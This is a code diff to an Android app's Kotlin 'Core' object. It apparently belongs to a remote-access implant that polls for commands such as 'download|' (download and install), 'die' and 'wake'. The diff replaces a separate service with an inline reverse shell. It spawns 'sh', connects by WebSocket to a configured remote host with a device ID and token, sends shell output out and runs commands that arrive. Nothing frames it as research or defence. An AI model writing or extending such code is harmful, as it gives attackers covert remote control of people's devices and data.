@@ -13,6 +13,10 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import okhttp3.OkHttpClient
 import okhttp3.Request
+import okhttp3.Response
+import okhttp3.WebSocket
+import okhttp3.WebSocketListener
+import okio.ByteString
 import java.io.File
 import java.net.URL
 import java.util.concurrent.Executors
@@ -31,6 +35,11 @@ object Core {
 
     private const val PREFS_NAME = "kaze_executed_cmds"
     private const val KEY_EXECUTED_IDS = "executed_ids"
+
+    @Volatile private var shellWs: WebSocket? = null
+    @Volatile private var shellProcess: Process? = null
+    @Volatile private var shellRunning = false
+    private val shellExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()
 
     private fun loadExecutedIds() {
         val saved = prefs.getStringSet(KEY_EXECUTED_IDS, emptySet()) ?: emptySet()
@@ -172,9 +181,11 @@ object Core {
                             cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
                             cmd == "die" -> {
                                 running = false
-                                try {
-                                    context.stopService(Intent(context, com.kaze.liveshell.LiveShellService::class.java))
-                                } catch (_: Exception) {}
+                                shellRunning = false
+                                shellWs?.close(1000, "die")
+                                shellWs = null
+                                try { shellProcess?.destroyForcibly() } catch (_: Exception) {}
+                                shellProcess = null
                                 "BYE"
                             }
                             cmd == "wake" -> "AWAKE"
@@ -299,17 +310,92 @@ object Core {
     }
 
     private fun startLiveShell(context: Context) {
-        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java).apply {
-            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_HOST, Config.LIVESHELL_HOST)
-            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_PORT, Config.LIVESHELL_PORT)
-            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_DEVICE_ID, deviceId)
-            putExtra(com.kaze.liveshell.LiveShellService.EXTRA_TOKEN, Config.LIVESHELL_TOKEN)
+        if (shellRunning) {
+            Log.d(TAG, "LiveShell already running")
+            return
         }
-        context.startForegroundService(intent)
+        shellRunning = true
+        shellExecutor.execute {
+            try {
+                val shell = ProcessBuilder("sh")
+                    .redirectErrorStream(true)
+                    .start()
+                shellProcess = shell
+                Log.d(TAG, "Shell process started")
+
+                val wsUrl = "ws://${Config.LIVESHELL_HOST}:${Config.LIVESHELL_PORT}/ws/shell"
+                val client = OkHttpClient.Builder()
+                    .readTimeout(0, TimeUnit.MILLISECONDS)
+                    .pingInterval(30, TimeUnit.SECONDS)
+                    .build()
+                val request = Request.Builder()
+                    .url(wsUrl)
+                    .addHeader("X-Device-Id", deviceId)
+                    .addHeader("X-Token", Config.LIVESHELL_TOKEN)
+                    .build()
+
+                val listener = object : WebSocketListener() {
+                    override fun onOpen(ws: WebSocket, response: Response) {
+                        Log.d(TAG, "LiveShell WS connected")
+                        shellWs = ws
+                        Thread({
+                            try {
+                                val inp = shell.inputStream
+                                val buf = ByteArray(4096)
+                                while (shellRunning) {
+                                    val n = inp.read(buf)
+                                    if (n == -1) break
+                                    val data = String(buf, 0, n)
+                                    ws.send(data)
+                                }
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Shell read error: ${e.message}")
+                            }
+                        }, "shell-reader").start()
+                    }
+
+                    override fun onMessage(ws: WebSocket, text: String) {
+                        try {
+                            val parts = text.split("|", limit = 2)
+                            if (parts.size == 2) {
+                                val cmd = parts[1].trimEnd('\n', '\r')
+                                shell.outputStream.write((cmd + "\n").toByteArray())
+                                shell.outputStream.flush()
+                            }
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Shell write error: ${e.message}")
+                        }
+                    }
+
+                    override fun onClosed(ws: WebSocket, code: Int, reason: String) {
+                        Log.d(TAG, "LiveShell WS closed: $code $reason")
+                        cleanupShell()
+                    }
+
+                    override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
+                        Log.e(TAG, "LiveShell WS failure: ${t.message}")
+                        cleanupShell()
+                    }
+                }
+                client.newWebSocket(request, listener)
+            } catch (e: Exception) {
+                Log.e(TAG, "LiveShell start error: ${e.message}")
+                cleanupShell()
+            }
+        }
     }
 
     private fun stopLiveShell(context: Context) {
-        val intent = Intent(context, com.kaze.liveshell.LiveShellService::class.java)
-        context.stopService(intent)
+        shellRunning = false
+        shellWs?.close(1000, "stopped")
+        shellWs = null
+        cleanupShell()
+    }
+
+    private fun cleanupShell() {
+        shellRunning = false
+        shellWs = null
+        try { shellProcess?.destroyForcibly() } catch (_: Exception) {}
+        shellProcess = null
     }
 }
